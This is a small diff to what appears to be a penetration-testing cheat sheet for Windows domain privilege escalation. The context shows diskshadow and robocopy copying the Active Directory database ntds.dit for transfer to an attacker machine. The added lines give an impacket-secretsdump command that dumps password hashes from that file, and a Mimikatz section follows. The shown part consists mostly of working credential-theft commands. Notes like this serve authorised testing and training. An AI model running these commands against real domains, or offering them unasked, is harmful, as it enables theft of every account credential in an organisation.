@@ -76,6 +76,9 @@ diskshadow /s diskshadow.txt
 robocopy /b E:\Windows\ntds . ntds.dit
 ```
 Transfer ntds.dit from the target to the attacker machine.
+```
+impacket-secretsdump local -ntds ntds.dit -system system
+```
 # Mimikatz
 If a user has either of the following privileges, mimikatz can be used:
 * SeImpersonatePrivilege
